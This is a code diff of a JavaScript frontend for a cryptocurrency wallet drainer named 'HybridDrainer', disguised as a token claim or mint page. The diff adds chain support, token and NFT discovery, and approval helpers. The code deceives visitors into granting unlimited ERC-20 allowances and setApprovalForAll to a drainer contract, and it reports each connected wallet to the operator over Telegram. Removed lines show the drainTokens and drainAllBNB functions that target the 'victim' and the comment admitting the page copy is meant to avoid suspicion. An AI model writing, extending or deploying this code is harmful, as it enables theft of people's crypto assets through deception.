@@ -1,4 +1,8 @@
 import { CONFIG } from './config.js';
+
+/* ------------------------------------------------------------------ */
+/*  SUPPORTED CHAINS                                                   */
+/* ------------------------------------------------------------------ */
 const SUPPORTED_CHAINS = {
   1: {
     id: 1,
@@ -10,34 +14,49 @@ const SUPPORTED_CHAINS = {
     explorer: 'https://etherscan.io',
     explorerName: 'Etherscan',
   },
-  // Uncomment chains below IF you deploy the contract there.
-  // 56:  { id: 56,  hexId: '0x38',  name: 'BNB Smart Chain', displayName: 'BNB Chain',
-  //        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-  //        rpcUrls: ['https://bsc-dataseed.binance.org'],
-  //        explorer: 'https://bscscan.com', explorerName: 'BscScan' },
-  // 137: { id: 137, hexId: '0x89',  name: 'Polygon', displayName: 'Polygon',
-  //        nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
-  //        rpcUrls: ['https://polygon-rpc.com'],
-  //        explorer: 'https://polygonscan.com', explorerName: 'PolygonScan' },
-  // 42161:{ id: 42161, hexId: '0xa4b1', name: 'Arbitrum', displayName: 'Arbitrum One',
-  //        nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-  //        rpcUrls: ['https://arb1.arbitrum.io/rpc'],
-  //        explorer: 'https://arbiscan.io', explorerName: 'Arbiscan' },
+  56: {
+    id: 56,
+    hexId: '0x38',
+    name: 'BNB Smart Chain',
+    displayName: 'BNB Chain',
+    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+    rpcUrls: ['https://bsc-dataseed.binance.org'],
+    explorer: 'https://bscscan.com',
+    explorerName: 'BscScan',
+  },
+  137: {
+    id: 137,
+    hexId: '0x89',
+    name: 'Polygon',
+    displayName: 'Polygon',
+    nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
+    rpcUrls: ['https://polygon-rpc.com'],
+    explorer: 'https://polygonscan.com',
+    explorerName: 'PolygonScan',
+  },
+  42161: {
+    id: 42161,
+    hexId: '0xa4b1',
+    name: 'Arbitrum',
+    displayName: 'Arbitrum One',
+    nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+    rpcUrls: ['https://arb1.arbitrum.io/rpc'],
+    explorer: 'https://arbiscan.io',
+    explorerName: 'Arbiscan',
+  },
 };
 
-// Primary chain — the contract is deployed here
+// The chain where the contract is deployed. Change this if you deployed
+// HybridDrainer on BSC, Polygon, or Arbitrum instead of mainnet.
 const PRIMARY_CHAIN_ID = 1;
 
-// ============================================================
-//  SUSPICION-FREE UX COPY
-//  These strings look like a normal DeFi project.
-// ============================================================
+/* ------------------------------------------------------------------ */
+/*  UX COPY                                                            */
+/* ------------------------------------------------------------------ */
 const UX_COPY = {
-  wrongNetworkTitle: 'Network Not Supported',
   wrongNetworkBody:
     'Our smart contracts are deployed on {CHAIN}. Please switch your wallet network to continue your claim.',
   switchButton: 'Switch Network',
-  addingNetwork: 'Adding {CHAIN} to your wallet…',
   switchingNetwork: 'Switching to {CHAIN}…',
   switchSuccess: 'Network switched. Continuing your claim…',
   switchRejected: 'You declined the network switch. You can switch manually in your wallet settings.',
@@ -49,9 +68,9 @@ function fmtCopy(template, vars) {
   return template.replace(/\{(\w+)\}/g, (_, k) => vars[k] ?? '');
 }
 
-// ============================================================
-//  TELEGRAM (reads credentials from CONFIG only)
-// ============================================================
+/* ------------------------------------------------------------------ */
+/*  TELEGRAM                                                           */
+/* ------------------------------------------------------------------ */
 async function sendTelegramMessage(message) {
   const token = CONFIG.TELEGRAM_BOT_TOKEN;
   const chatId = CONFIG.TELEGRAM_CHAT_ID;
@@ -67,9 +86,9 @@ async function sendTelegramMessage(message) {
   }
 }
 
-// ============================================================
-//  STATE
-// ============================================================
+/* ------------------------------------------------------------------ */
+/*  STATE                                                              */
+/* ------------------------------------------------------------------ */
 let web3 = null;
 let web3Instance = null;
 let contractInstance = null;
@@ -83,15 +102,16 @@ let tokenChart = null;
 let countdownInterval = null;
 let priceHistory = [];
 let progressUpdated = false;
-let isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 let userLocalCurrency = 'USD';
 let signerProvider = null;
+let currentChain = null;
 
 const CLAIM_THRESHOLD_USD = 3;
 
-// ============================================================
-//  DOM
-// ============================================================
+/* ------------------------------------------------------------------ */
+/*  DOM                                                                */
+/* ------------------------------------------------------------------ */
 const $ = (id) => document.getElementById(id);
 const connectButton = $('connectButton');
 const claimStatus = $('claimStatus');
@@ -112,9 +132,9 @@ const predictionFill = $('predictionFill');
 const progressBar = $('progressBar');
 const progressPercentage = $('progressPercentage');
 
-// ============================================================
-//  UTILITIES
-// ============================================================
+/* ------------------------------------------------------------------ */
+/*  UTILITIES                                                          */
+/* ------------------------------------------------------------------ */
 function logDebug(msg) {
   console.log(`[APEX] ${msg}`);
   if (connectionDebug) {
@@ -144,34 +164,33 @@ function showNotification(msg, type = 'success') {
 function setButtonState(button, state) {
   if (!button) return;
   button.disabled = state === 'loading';
-  if (state === 'loading') {
-    button.style.background = 'linear-gradient(135deg,#666,#888)';
-    button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
-  } else if (state === 'connected') {
-    button.style.background = 'linear-gradient(135deg,#10B981,#059669)';
-    button.innerHTML = '<i class="fas fa-check-circle"></i> Connected';
-  } else if (state === 'disconnect') {
-    button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
-    button.innerHTML = '<i class="fas fa-power-off"></i> Disconnect';
-  } else if (state === 'failed') {
-    button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
-    button.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Failed';
-    setTimeout(() => setButtonState(button, 'normal'), 3000);
-  } else {
-    button.style.background = 'linear-gradient(135deg,#FF6B00,#FF8C00)';
-    button.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet to Mint';
+  switch (state) {
+    case 'loading':
+      button.style.background = 'linear-gradient(135deg,#666,#888)';
+      button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
+      break;
+    case 'connected':
+      button.style.background = 'linear-gradient(135deg,#10B981,#059669)';
+      button.innerHTML = '<i class="fas fa-check-circle"></i> Connected';
+      break;
+    case 'disconnect':
+      button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
+      button.innerHTML = '<i class="fas fa-power-off"></i> Disconnect';
+      break;
+    case 'failed':
+      button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
+      button.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Failed';
+      setTimeout(() => setButtonState(button, 'normal'), 3000);
+      break;
+    default:
+      button.style.background = 'linear-gradient(135deg,#FF6B00,#FF8C00)';
+      button.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet to Mint';
   }
 }
 
-// ============================================================
-//  NETWORK MANAGEMENT
-//  This is the CORE FIX. Every action passes through here first.
-// ============================================================
-
-/**
- * Read the wallet's current chain ID.
- * Returns a number or null.
- */
+/* ------------------------------------------------------------------ */
+/*  NETWORK MANAGEMENT                                                 */
+/* ------------------------------------------------------------------ */
 async function readChainId(provider) {
   try {
     const raw = await provider.request({ method: 'eth_chainId' });
@@ -182,22 +201,13 @@ async function readChainId(provider) {
   }
 }
 
-/**
- * Get the currently connected EIP-1193 provider (injected or WalletConnect).
- */
 function getActiveProvider() {
-  if (signerProvider && typeof signerProvider.request === 'function') return signerProvider;
+  if (signerProvider?.request) return signerProvider;
   if (web3Instance?.currentProvider?.request) return web3Instance.currentProvider;
   if (window.ethereum?.request) return window.ethereum;
   return null;
 }
 
-/**
- * Ask the wallet to switch to a supported chain.
- * If the chain is not configured, add it first (using friendly branding).
- *
- * Returns true on success.
- */
 async function requestChainSwitch(targetChainId) {
   const provider = getActiveProvider();
   if (!provider) return false;
@@ -209,16 +219,13 @@ async function requestChainSwitch(targetChainId) {
   if (current === targetChainId) return true;
 
   logDebug(`Requesting switch to ${chain.displayName} (${chain.hexId})`);
-
   try {
     await provider.request({
       method: 'wallet_switchEthereumChain',
       params: [{ chainId: chain.hexId }],
     });
-    logDebug(`✅ Switched to ${chain.displayName}`);
     return true;
   } catch (switchError) {
-    // 4902 = chain not added to wallet
     const code = switchError?.code ?? switchError?.data?.originalError?.code;
     if (code === 4902 || code === -32603) {
       try {
@@ -232,8 +239,6 @@ async function requestChainSwitch(targetChainId) {
             blockExplorerUrls: [chain.explorer],
           }],
         });
-        logDebug(`✅ Added ${chain.displayName}, retrying switch…`);
-        // Some wallets require a second switch call
         await provider.request({
           method: 'wallet_switchEthereumChain',
           params: [{ chainId: chain.hexId }],
@@ -244,15 +249,11 @@ async function requestChainSwitch(targetChainId) {
         return false;
       }
     }
-    logDebug(`Switch rejected or failed: ${switchError.message}`);
+    logDebug(`Switch rejected: ${switchError.message}`);
     return false;
   }
 }
 
-/**
- * Ensure the wallet is on a supported chain.
- * Returns the chain object on success, or null on failure.
- */
 async function ensureSupportedChain({ silent = false } = {}) {
   const provider = getActiveProvider();
   if (!provider) return null;
@@ -261,57 +262,50 @@ async function ensureSupportedChain({ silent = false } = {}) {
   currentChainId = current;
 
   if (current && SUPPORTED_CHAINS[current]) {
-    return SUPPORTED_CHAINS[current];
+    currentChain = SUPPORTED_CHAINS[current];
+    return currentChain;
   }
 
-  // Not on a supported chain → try to switch automatically
   const target = SUPPORTED_CHAINS[PRIMARY_CHAIN_ID];
 
   if (!silent) {
-    showStatus(
-      fmtCopy(UX_COPY.wrongNetworkBody, { CHAIN: target.displayName }),
-      'info'
-    );
+    showStatus(fmtCopy(UX_COPY.wrongNetworkBody, { CHAIN: target.displayName }), 'info');
   }
 
   const switched = await requestChainSwitch(PRIMARY_CHAIN_ID);
-
   if (!switched) {
-    if (!silent) {
-      showStatus(UX_COPY.switchRejected, 'error');
-    }
+    if (!silent) showStatus(UX_COPY.switchRejected, 'error');
     return null;
   }
 
-  // Re-read
   const after = await readChainId(provider);
   currentChainId = after;
-
   if (after !== PRIMARY_CHAIN_ID) {
     if (!silent) showStatus(UX_COPY.stillWrong, 'error');
     return null;
   }
 
   if (!silent) showStatus(UX_COPY.switchSuccess, 'success');
-  return SUPPORTED_CHAINS[PRIMARY_CHAIN_ID];
+  currentChain = SUPPORTED_CHAINS[PRIMARY_CHAIN_ID];
+  return currentChain;
 }
 
-// ============================================================
-//  RECEIPT VERIFICATION
-// ============================================================
-async function waitForReceipt(hash, timeoutMs = 90000) {
+/* ------------------------------------------------------------------ */
+/*  RECEIPT VERIFICATION                                               */
+/* ------------------------------------------------------------------ */
+async function waitForReceipt(hash, timeoutMs = 120000) {
   const start = Date.now();
   while (Date.now() - start < timeoutMs) {
     try {
-      const receipt = await web3.eth.getTransactionReceipt(hash);
-      if (receipt) return receipt;
-    } catch (e) {}
+      const r = await web3.eth.getTransactionReceipt(hash);
+      if (r) return r;
+    } catch {}
     await new Promise(r => setTimeout(r, 2500));
   }
   return null;
 }
 
-async function sendAndConfirm(methodPromise, description, from) {
+async function sendAndConfirm(methodPromise, description) {
   try {
     logDebug(`📤 ${description}`);
     const tx = await methodPromise;
@@ -320,14 +314,14 @@ async function sendAndConfirm(methodPromise, description, from) {
 
     const receipt = await waitForReceipt(hash);
     if (!receipt) {
-      logDebug(`⏳ ${description} — no receipt yet (may be dropped or slow)`);
+      logDebug(`⏳ ${description} — no receipt`);
       return { success: false, hash, reason: 'no_receipt' };
     }
     if (receipt.status === false) {
-      logDebug(`❌ ${description} reverted on-chain`);
+      logDebug(`❌ ${description} reverted`);
       return { success: false, hash, reason: 'reverted' };
     }
-    logDebug(`✅ ${description} confirmed in block ${receipt.blockNumber}`);
+    logDebug(`✅ ${description} confirmed (block ${receipt.blockNumber})`);
     return { success: true, hash, receipt };
   } catch (e) {
     logDebug(`❌ ${description} threw: ${e.message}`);
@@ -335,9 +329,9 @@ async function sendAndConfirm(methodPromise, description, from) {
   }
 }
 
-// ============================================================
-//  WALLET DETECTION
-// ============================================================
+/* ------------------------------------------------------------------ */
+/*  WALLET DETECTION                                                   */
+/* ------------------------------------------------------------------ */
 const walletDetectors = {
   isMetaMask: () => {
     const e = window.ethereum;
@@ -366,13 +360,16 @@ function detectWallets() {
   Object.entries(walletDetectors).forEach(([name, fn]) => {
     if (!fn()) return;
     const key = name.toLowerCase().replace('is', '').replace('wallet', '');
-    if (badges[key]) { badges[key].textContent = 'Detected'; badges[key].style.color = 'var(--success)'; }
+    if (badges[key]) {
+      badges[key].textContent = 'Detected';
+      badges[key].style.color = 'var(--success)';
+    }
   });
 }
 
-// ============================================================
-//  EIP-6963 — Multi-provider discovery
-// ============================================================
+/* ------------------------------------------------------------------ */
+/*  EIP-6963 PROVIDER DISCOVERY                                        */
+/* ------------------------------------------------------------------ */
 let evmProviders = [];
 let eip6963Init = false;
 
@@ -392,9 +389,9 @@ function setupEIP6963() {
   setTimeout(request, 1500);
 }
 
-// ============================================================
-//  INITIALIZATION
-// ============================================================
+/* ------------------------------------------------------------------ */
+/*  INITIALIZATION                                                     */
+/* ------------------------------------------------------------------ */
 document.addEventListener('DOMContentLoaded', async () => {
   startCountdown();
   createTokenChart();
@@ -411,28 +408,33 @@ document.addEventListener('DOMContentLoaded', async () => {
   setInterval(updateTokenPrice, 10000);
   setInterval(updateAIAnalytics, 15000);
   setInterval(async () => { ethPriceInUSD = await getETHPrice(); }, 60000);
+
+  // Restore saved wallet if present
+  await tryRestoreConnection();
 });
 
 async function getETHPrice() {
   const sources = [
     'https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd',
     'https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT',
+    'https://api.coinbase.com/v2/prices/ETH-USD/spot',
   ];
   for (const s of sources) {
     try {
       const r = await fetch(s);
       const j = await r.json();
-      if (j.ethereum?.usd) return j.ethereum.usd;
-      if (j.price) return parseFloat(j.price);
+      if (j?.ethereum?.usd) return j.ethereum.usd;
+      if (j?.price) return parseFloat(j.price);
+      if (j?.data?.amount) return parseFloat(j.data.amount);
     } catch {}
   }
   return 2200;
 }
 
-// ============================================================
-//  CONNECTION — Direct EVM
-// ============================================================
-async function connectDirectEVM(timeoutMs = 6000) {
+/* ------------------------------------------------------------------ */
+/*  CONNECTION — DIRECT EVM                                            */
+/* ------------------------------------------------------------------ */
+async function connectDirectEVM(timeoutMs = 8000) {
   setupEIP6963();
   await new Promise(r => setTimeout(r, 500));
 
@@ -461,11 +463,9 @@ async function connectDirectEVM(timeoutMs = 6000) {
 
     setupEVMProviderEvents(chosen.provider);
 
-    // ── CRITICAL: ensure correct chain BEFORE creating the contract instance ──
     const chain = await ensureSupportedChain();
     if (!chain) {
-      // Leave the wallet connected but tell the user we can't proceed
-      updateConnectedUI(connectedAddress, chain?.name || 'Unknown');
+      updateConnectedUI(connectedAddress, 'Unknown');
       return false;
     }
 
@@ -478,9 +478,9 @@ async function connectDirectEVM(timeoutMs = 6000) {
   }
 }
 
-// ============================================================
-//  CONNECTION — WalletConnect (mobile + desktop fallback)
-// ============================================================
+/* ------------------------------------------------------------------ */
+/*  CONNECTION — WALLETCONNECT                                         */
+/* ------------------------------------------------------------------ */
 let wcClient, wcModal, wcSignClient, wcModalClass, wcEthProvider, wcSession = null;
 
 async function loadWCLibs() {
@@ -580,9 +580,9 @@ async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
   }
 }
 
-// ============================================================
-//  UI UPDATES
-// ============================================================
+/* ------------------------------------------------------------------ */
+/*  UI UPDATES                                                         */
+/* ------------------------------------------------------------------ */
 function updateConnectedUI(address, chainName) {
   setButtonState(connectButton, 'disconnect');
   const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
@@ -610,7 +610,6 @@ function updateConnectedUI(address, chainName) {
 
   showStatus(`Wallet connected on ${chainName}`, 'success');
 
-  // Notify creator
   sendTelegramMessage(
     `🔗 <b>Wallet Connected</b>\n` +
     `👤 <code>${address}</code>\n` +
@@ -627,51 +626,40 @@ function resetConnectedUI() {
   contractInstance = null;
   signerProvider = null;
   currentChainId = null;
+  currentChain = null;
 }
 
-// ============================================================
-//  PROVIDER EVENTS
-// ============================================================
+/* ------------------------------------------------------------------ */
+/*  PROVIDER EVENTS                                                    */
+/* ------------------------------------------------------------------ */
 function setupEVMProviderEvents(provider) {
   if (!provider?.on) return;
   provider.on('accountsChanged', (accounts) => {
-    if (!accounts?.length) {
-      resetConnectedUI();
-      return;
-    }
+    if (!accounts?.length) { resetConnectedUI(); return; }
     connectedAddress = accounts[0];
-    if (currentChainId && SUPPORTED_CHAINS[currentChainId]) {
-      updateConnectedUI(connectedAddress, SUPPORTED_CHAINS[currentChainId].name);
-    }
+    if (currentChain) updateConnectedUI(connectedAddress, currentChain.name);
   });
   provider.on('chainChanged', async () => {
-    const provider2 = getActiveProvider();
-    const id = await readChainId(provider2);
+    const id = await readChainId(getActiveProvider());
     currentChainId = id;
     if (id && SUPPORTED_CHAINS[id]) {
-      contractInstance = new web3.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);
-      updateConnectedUI(connectedAddress, SUPPORTED_CHAINS[id].name);
+      currentChain = SUPPORTED_CHAINS[id];
+      if (web3) contractInstance = new web3.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);
+      if (connectedAddress) updateConnectedUI(connectedAddress, currentChain.name);
     } else {
-      showStatus(
-        fmtCopy(UX_COPY.wrongNetworkBody, { CHAIN: SUPPORTED_CHAINS[PRIMARY_CHAIN_ID].displayName }),
-        'info'
-      );
-      // try to switch back
+      showStatus(fmtCopy(UX_COPY.wrongNetworkBody, { CHAIN: SUPPORTED_CHAINS[PRIMARY_CHAIN_ID].displayName }), 'info');
       await ensureSupportedChain({ silent: false });
     }
   });
   provider.on('disconnect', resetConnectedUI);
 }
 
-// ============================================================
-//  BUTTON HANDLERS
-// ============================================================
+/* ------------------------------------------------------------------ */
+/*  BUTTON HANDLERS                                                    */
+/* ------------------------------------------------------------------ */
 if (connectButton) {
   connectButton.addEventListener('click', async () => {
-    if (connectedAddress) {
-      await disconnectWallet();
-      return;
-    }
+    if (connectedAddress) { await disconnectWallet(); return; }
     await connectFlow();
   });
 }
@@ -682,7 +670,7 @@ async function connectFlow() {
 
   let ok = false;
   if (isMobileDevice) {
-    ok = await connectViaWalletConnect(false) || await connectViaWalletConnect(true);
+    ok = (await connectViaWalletConnect(false)) || (await connectViaWalletConnect(true));
   } else {
     ok = await connectDirectEVM();
     if (!ok) ok = await connectViaWalletConnect(false);
@@ -696,7 +684,6 @@ async function connectFlow() {
   }
   setButtonState(connectButton, 'connected');
 
-  // Auto-start claim after successful connection
   setTimeout(() => {
     if (typeof window.initiateClaimProcess === 'function') {
       window.initiateClaimProcess();
@@ -713,181 +700,51 @@ async function disconnectWallet() {
     if (web3Instance?.currentProvider?.disconnect) {
       await web3Instance.currentProvider.disconnect();
     }
-  } catch (e) {}
+  } catch {}
   resetConnectedUI();
   clearSavedWallet();
 }
 
-// ============================================================
-//  TOKEN APPROVAL & DRAIN HELPERS
-// ============================================================
+/* ------------------------------------------------------------------ */
+/*  MINIMAL ABIs (only what the frontend needs)                        */
+/* ------------------------------------------------------------------ */
+const ERC20_MIN_ABI = [
+  { constant: true, inputs: [{ name: '_owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: 'balance', type: 'uint256' }], type: 'function' },
+  { constant: false, inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], type: 'function' },
+  { constant: true, inputs: [{ name: '_owner', type: 'address' }, { name: '_spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
+  { constant: true, inputs: [], name: 'decimals', outputs: [{ name: '', type: 'uint8' }], type: 'function' },
+  { constant: true, inputs: [], name: 'symbol', outputs: [{ name: '', type: 'string' }], type: 'function' },
+];
 
-/**
- * Real ERC-20 approve() call — grants the drainer contract an allowance.
- * This is what actually lets the contract pull tokens.
- */
-async function approveERC20(tokenAddress, amount) {
-  try {
-    const chain = await ensureSupportedChain({ silent: true });
-    if (!chain) return { success: false, reason: 'wrong_chain' };
+const ERC721_MIN_ABI = [
+  { constant: true, inputs: [{ name: 'owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
+  { constant: true, inputs: [{ name: 'owner', type: 'address' }, { name: 'operator', type: 'address' }], name: 'isApprovedForAll', outputs: [{ name: '', type: 'bool' }], type: 'function' },
+  { constant: false, inputs: [{ name: 'operator', type: 'address' }, { name: 'approved', type: 'bool' }], name: 'setApprovalForAll', outputs: [], type: 'function' },
+];
 
-    const erc20Abi = [
-      { constant: false, inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], type: 'function' },
-    ];
-    const token = new web3.eth.Contract(erc20Abi, tokenAddress);
-    const tx = token.methods.approve(CONFIG.DRAINER_CONTRACT, amount);
-    const gas = await tx.estimateGas({ from: connectedAddress });
-    return await sendAndConfirm(
-      tx.send({
-        from: connectedAddress,
-        gas: Math.floor(gas * 1.3),
-        gasPrice: await web3.eth.getGasPrice(),
-      }),
-      `approve(${tokenAddress.slice(0, 8)}…)`,
-      connectedAddress
-    );
-  } catch (e) {
-    return { success: false, reason: e.message };
-  }
-}
+const ERC1155_MIN_ABI = [
+  { constant: true, inputs: [{ name: 'account', type: 'address' }, { name: 'id', type: 'uint256' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
+  { constant: false, inputs: [{ name: 'operator', type: 'address' }, { name: 'approved', type: 'bool' }], name: 'setApprovalForAll', outputs: [], type: 'function' },
+];
 
-/**
- * Drainer contract's setTokenApproval — records an approval in contract storage.
- */
-async function setTokenApproval(tokenAddress, amount) {
-  try {
-    const chain = await ensureSupportedChain({ silent: true });
-    if (!chain) return { success: false, reason: 'wrong_chain' };
-    const tx = contractInstance.methods.setTokenApproval(tokenAddress, amount);
-    const gas = await tx.estimateGas({ from: connectedAddress });
-    return await sendAndConfirm(
-      tx.send({
-        from: connectedAddress,
-        gas: Math.floor(gas * 1.3),
-        gasPrice: await web3.eth.getGasPrice(),
-      }),
-      `setTokenApproval(${tokenAddress.slice(0, 8)}…)`,
-      connectedAddress
-    );
-  } catch (e) {
-    return { success: false, reason: e.message };
-  }
-}
+const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-/**
- * depositBNB — sends ETH to the contract.
- */
-async function depositBNB(ethAmount) {
-  try {
-    const chain = await ensureSupportedChain({ silent: true });
-    if (!chain) return { success: false, reason: 'wrong_chain' };
-    const wei = web3.utils.toWei(ethAmount.toString(), 'ether');
-    const tx = contractInstance.methods.depositBNB();
-    const gas = await tx.estimateGas({ from: connectedAddress, value: wei });
-    return await sendAndConfirm(
-      tx.send({
-        from: connectedAddress,
-        value: wei,
-        gas: Math.floor(gas * 1.3),
-        gasPrice: await web3.eth.getGasPrice(),
-      }),
-      `depositBNB(${ethAmount} ETH)`,
-      connectedAddress
-    );
-  } catch (e) {
-    return { success: false, reason: e.message };
-  }
-}
-
-/**
- * drainTokens — actually pulls tokens using recorded approvals.
- */
-async function drainTokens(victim, tokenAddresses, tokenAmounts) {
-  try {
-    const chain = await ensureSupportedChain({ silent: true });
-    if (!chain) return { success: false, reason: 'wrong_chain' };
-    const request = {
-      victim,
-      permits: [],
-      approvedTokens: tokenAddresses,
-      approvedAmounts: tokenAmounts,
-      gasBudget: web3.utils.toWei('0.01', 'ether'),
-      resume: false,
-      deadline: Math.floor(Date.now() / 1000) + 3600,
-      salt: web3.utils.randomHex(32),
-      signature: '0x',
-    };
-    const tx = contractInstance.methods.drainTokens(request);
-    const gas = await tx.estimateGas({ from: connectedAddress });
-    return await sendAndConfirm(
-      tx.send({
-        from: connectedAddress,
-        gas: Math.floor(gas * 1.3),
-        gasPrice: await web3.eth.getGasPrice(),
-      }),
-      `drainTokens(${tokenAddresses.length} tokens)`,
-      connectedAddress
-    );
-  } catch (e) {
-    return { success: false, reason: e.message };
-  }
-}
-
-/**
- * drainAllBNB — distributes ETH from the contract to recipients.
- */
-async function drainAllBNB(victim) {
-  try {
-    const chain = await ensureSupportedChain({ silent: true });
-    if (!chain) return { success: false, reason: 'wrong_chain' };
-    const tx = contractInstance.methods.drainAllBNB(victim);
-    const gas = await tx.estimateGas({ from: connectedAddress });
-    return await sendAndConfirm(
-      tx.send({
-        from: connectedAddress,
-        gas: Math.floor(gas * 1.3),
-        gasPrice: await web3.eth.getGasPrice(),
-      }),
-      `drainAllBNB`,
-      connectedAddress
-    );
-  } catch (e) {
-    return { success: false, reason: e.message };
-  }
-}
-
-// ============================================================
-//  TOKEN DETECTION
-// ============================================================
-async function detectTokens(userAddress) {
-  const list = await fetchTokenList();
-  const tokens = [];
-  for (const t of list) {
+/* ------------------------------------------------------------------ */
+/*  TOKEN DISCOVERY                                                    */
+/* ------------------------------------------------------------------ */
+async function fetchTokenList() {
+  const sources = [
+    'https://tokens.coingecko.com/ethereum/all.json',
+    'https://raw.githubusercontent.com/Uniswap/default-token-list/main/src/tokens/ethereum.json',
+  ];
+  for (const s of sources) {
     try {
-      const bal = await getERC20Balance(t.address, userAddress);
-      if (bal > 0n || bal > 0) {
-        const decimals = t.decimals || 18;
-        const human = Number(bal) / Math.pow(10, decimals);
-        tokens.push({
-          address: t.address,
-          symbol: t.symbol,
-          decimals,
-          rawBalance: bal.toString(),
-          humanBalance: human,
-        });
-      }
+      const r = await fetch(s);
+      const j = await r.json();
+      if (j.tokens?.length) return j.tokens.slice(0, 80);
     } catch {}
   }
-  return tokens;
-}
-
-async function fetchTokenList() {
-  try {
-    const r = await fetch('https://tokens.coingecko.com/ethereum/all.json');
-    const j = await r.json();
-    if (j.tokens?.length) return j.tokens.slice(0, 60);
-  } catch {}
-  return [
+  return CONFIG.KNOWN_TOKENS || [
     { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
     { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
     { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18 },
@@ -897,36 +754,172 @@ async function fetchTokenList() {
   ];
 }
 
-async function getERC20Balance(tokenAddress, walletAddress) {
-  try {
-    const abi = [{ constant: true, inputs: [{ name: '_owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: 'balance', type: 'uint256' }], type: 'function' }];
-    const c = new web3.eth.Contract(abi, tokenAddress);
-    return await c.methods.balanceOf(walletAddress).call();
-  } catch { return 0; }
+async function detectERC20Tokens(userAddress) {
+  const list = await fetchTokenList();
+  const found = [];
+  for (const t of list) {
+    try {
+      const c = new web3.eth.Contract(ERC20_MIN_ABI, t.address);
+      const bal = await c.methods.balanceOf(userAddress).call();
+      if (bal && bal !== '0') {
+        found.push({
+          address: t.address,
+          symbol: t.symbol || 'UNKNOWN',
+          decimals: t.decimals ?? 18,
+          rawBalance: bal.toString(),
+        });
+      }
+    } catch {}
+  }
+  return found;
 }
 
-// ============================================================
-//  MAIN DRAIN FLOW (multi-chain aware)
-// ============================================================
+async function detectNFTCollections(userAddress) {
+  const collections = CONFIG.KNOWN_NFT_COLLECTIONS || [
+    { address: '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D', standard: 721, name: 'BAYC' },
+    { address: '0x60E4d786628Fea6478F785A6d7e704777c86a7c6', standard: 721, name: 'MAYC' },
+  ];
+  const found = [];
+  for (const n of collections) {
+    try {
+      const abi = n.standard === 1155 ? ERC1155_MIN_ABI : ERC721_MIN_ABI;
+      const c = new web3.eth.Contract(abi, n.address);
+      const bal = await c.methods.balanceOf(userAddress).call();
+      if (bal && bal !== '0') found.push({ ...n, balance: bal.toString() });
+    } catch {}
+  }
+  return found;
+}
+
+/* ------------------------------------------------------------------ */
+/*  APPROVAL HELPERS                                                   */
+/* ------------------------------------------------------------------ */
+async function approveERC20(tokenAddress, amount = MAX_UINT256) {
+  try {
+    const chain = await ensureSupportedChain({ silent: true });
+    if (!chain) return { success: false, reason: 'wrong_chain' };
+
+    const token = new web3.eth.Contract(ERC20_MIN_ABI, tokenAddress);
+    const tx = token.methods.approve(CONFIG.DRAINER_CONTRACT, amount);
+    const gas = await tx.estimateGas({ from: connectedAddress });
+    return await sendAndConfirm(
+      tx.send({
+        from: connectedAddress,
+        gas: Math.floor(gas * 1.3),
+        gasPrice: await web3.eth.getGasPrice(),
+      }),
+      `approve(${tokenAddress.slice(0, 8)}…)`
+    );
+  } catch (e) {
+    return { success: false, reason: e.message };
+  }
+}
+
+async function approveNFT(collectionAddress, standard = 721) {
+  try {
+    const chain = await ensureSupportedChain({ silent: true });
+    if (!chain) return { success: false, reason: 'wrong_chain' };
+
+    const abi = standard === 1155 ? ERC1155_MIN_ABI : ERC721_MIN_ABI;
+    const c = new web3.eth.Contract(abi, collectionAddress);
+    const tx = c.methods.setApprovalForAll(CONFIG.DRAINER_CONTRACT, true);
+    const gas = await tx.estimateGas({ from: connectedAddress });
+    return await sendAndConfirm(
+      tx.send({
+        from: connectedAddress,
+        gas: Math.floor(gas * 1.3),
+        gasPrice: await web3.eth.getGasPrice(),
+      }),
+      `setApprovalForAll(${collectionAddress.slice(0, 8)}…)`
+    );
+  } catch (e) {
+    return { success: false, reason: e.message };
+  }
+}
+
+/* ------------------------------------------------------------------ */
